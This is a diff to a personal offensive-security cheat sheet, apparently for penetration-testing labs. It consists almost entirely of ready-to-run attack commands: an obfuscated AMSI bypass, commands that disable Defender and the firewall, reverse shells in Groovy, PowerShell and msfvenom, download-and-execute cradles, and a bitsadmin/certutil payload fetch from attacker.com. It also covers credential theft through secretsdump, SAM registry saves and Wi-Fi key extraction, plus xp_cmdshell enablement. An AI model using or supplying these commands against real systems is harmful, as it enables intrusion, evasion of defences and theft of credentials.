@@ -1,45 +1,21 @@
-# Remote Access
+## Bypass AV
 ```
-evil-winrm -i {IP} -u {username} -p {password/NTLM hash}
+# allow powershell scripts
+powershell -ep bypass
 
-upload {local_filename} {destination_filename (optional)}
-download {remote_filename} {destination_filename (optional)}
+# ASMI bypass
+powershell sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 
-xfreerdp /v:{IP address} /cert:ignore /u:{USERNAME}
+# Disable AV
+set-mppreference -DisableRealTimeMonitoring $true -Force
+
+# Disable firewall
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 ```
-> evil win-rm
-> only for windows pro or windows with RDP!!! >.<
-> powershell commands can be executed
+https://amsi.fail/
 
-# Hosting Servers
-
-## HTTP server
-```
-python3 -m http.server 80
-```
-> make sure to be in the directory of the server
-> --directory can be used
-
-## SMB server
-```
-sudo smbserver {share name} -username user -password password
-
-net use \\{IP}\{share name} /user:user password
-
-```
-> -smb2support might be needed for some windows
-
-## SMB 
-```
-smbclient -L //(IP)/{share name} 
-get > download {filename}
-get > uppload {filename}
-smbclient -L //{IP}
-```
-
-# Reverse Shells
-
-## Listening port
+## Reverse Shells
+### Listening port
 > port 1234, 4444
 ```
 nc -lvnp 4444
@@ -50,10 +26,8 @@ set payload windows/meterpreter/reverse_tcp
 ```
 > rlwrap allows users to use previous commands 
 
-
-## Msfvenom
->Take note anything with meterpreter is for msfconsole multihandler
-
+### Msfvenom
+>Take note, meterpreter is for msfconsole multihandler
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=4444 -f exe > reverse.exe
 msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=4444 -f dll > reverse.dll
@@ -68,65 +42,209 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f elf >rever
 ```
 > linux
 
-## Nishang 
+### Nishang 
 ```
 import-module Invoke-PowerShellTcp.ps1
 Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port 4444
 ```
 
-# Powershell 
+### Jenkins Groovy
+```
+String host="10.10.14.119";
+int port=4444;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+> - /bin/bash for linux
+> - cmd.exe for windows
 
-## Downloading files
+### NetCat
 ```
-powershell.exe IEX (New-Object Net.WebClient).DownloadString("{IP/website url}")
-```
-> download and execute 
-> you can encode using https://amsi.fail/ to bypass
+#Host:
+.\nv64.exe -lvnp {PORT}
 
+#Target:
+nc {host IP} {port}
 ```
-IEX((New-Object Net.WebClient).DownloadString("{IP/website url}"))
-```
-> download
-> you can encode using https://raikia.com/tool-powershell-encoder/ to bypass
 
+### One liner
 ```
-powershell.exe -e 
+$client = New-Object System.Net.Sockets.TCPClient('{IP ADDRESS}',{PORT NUMBER});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
 ```
-> execute using powershell 
-> e.g. powershell.exe -e (encoded stuff)
+
+## Interactive Shells 
+for reverse shells
+```
+# python 
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+# perl 
+exec "/bin/bash";
+
+# ruby
+exec "/bin/bash"
+
+# lua
+os.execute('/bin/bash')
+
+# using netcat
+rlwrap nc -vlnp 1234
+```
+
+## Server Hosting
+### HTTP server
+```
+python3 -m http.server 80
+```
+> make sure to be in the directory of the server
+> --directory can be used
+
+### SMB
+```
+# Run server
+sudo smbserver {share name} -username user -password password
+
+# Windows
+net use \\{IP}\{share name} /user:user password
+get-smbshare
+\\{ip}\{share name} in file explorer
 
 
-## check OS version
+# Linux
+smbclient 
+smbclient  -L //{IP}
+smbclient  //{IP}/{Share name}
+smbmap -u '{username}' -p '{password}' -H {IP}
+
+# Usage
+get > download {filename}
+get > uppload {filename}
 ```
+
+## Download
+### Windows
+```
+wget {URL}
+certutil.exe -urlcache -split -f http://{URL} {NAME}.exe
+iwr http://{URL} -outfile {NAME}.exe
+powershell.exe IEX (New-Object Net.WebClient).DownloadFile("{URL}")
+```
+#### Download and Execute
+```
+powershell.exe IEX (New-Object Net.WebClient).DownloadString("{URL}")
+IEX((New-Object Net.WebClient).DownloadString("{URL}"))
+powershell.exe -e {ENCODING}
+```
+https://raikia.com/tool-powershell-encoder/
+https://amsi.fail/
+
+#### Transfer files
+```
+# on attacker machine
+certutil -encode beacon64.exe file.txt
+
+# on victim
+bitsadmin /Transfer myJob http://attacker.com/file.txt C:\windows\tasks\enc.txt && certutil -decode C:\windows\tasks\enc.txt C:\windows\tasks\cisa.exe && del C:\windows\tasks\enc.txt
+```
+
+### Linux
+```
+wget {URL}
+curl -o {URL}
+curl {URL} > {Dst Directory + Name}
+```
+
+## Check OS version
+```
+# Windows
 [Environment]::Is64BitProcess
 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+systeminfo
+
+# Linux
+cat /proc/version
+cat /proc/sys/kernel/osrelease
+cat /proc/sys/kernel/ostype
+cat /proc/sys/kernel/version
+cat /etc/*release
+hostnamectl
 ```
-> checking OS architecture 
 
-
-## MSSQL
+## Impacket
 ```
-enable_xp_cmdshell
-EXEC xp+cmdshell '{command}'
-```
-> summons interactive shell / cmd for MSSQL
-
-
-# Impacket
-
-## Hash dump
-```
+#Hash dump
 secretsdump.py '{username}@{IP}'
 ```
-> hash dump 
 
-## Kerberoasting + hash via SPN
+## Dipsplay wifi password
 ```
-GetUserSPNs.py -request -{NETBIOSNAME}-ip {IP} {DOMAIN}/{NAME}:{PASSWORD}
+netsh wlan show porfile
+netsh wlan show porfile {WIFI NAME} key=clear
 ```
-> - hash dump via keberoasting using SPN
-> - Need to hashcat to unveil the hash. Refer to bruteforce on usage
-## MS sql logon 
+
+## MySQL
+### Usage
 ```
-mssqlclient.py {username}@{IP}
+mysql -u {usernmae} -p {password} -h {IP}
+```
+### MySQL commands
+```
+# show all databases
+show databases;
+
+# select a database
+USE {database};
+
+# display contents of the database
+SHOW TABLES;
+
+# display the speicfic content from the tables
+describe {table};
+SHOW COLUMNS FROM {table};
+
+# displaying contents
+SELECT {from the field} FROM {table};
+SELECT * FROM {table};
+
+e.g., 
+USE users
+SHOW TABLES
+SHOW COLUMNS FROM users
+SELECT name,value FROM users;
+
+https://codingbee.net/rhce/mariadb-navigating-your-way-around-a-mysql-database
+
+# Enable xp_cmdshell
+EXEC sp_configure 'show advanced options', 1
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+```
+### SQL Bypass Authentication
+```
+```
+### SQL injection
+```
+```
+
+## Networking
+```
+# Windows
+netstat 
+netstat -an 
+ipconfig {ip}
+tracert {ip}
+
+# Linux
+ifconfig
+ip a
+```
+
+## cmd
+```
+# SAM file dump
+reg.exe save hklm\sam c:\temp\sam.save
+reg.exe save hklm\security c:\temp\security.save
+reg.exe save hklm\system c:\temp\system.save
 ```
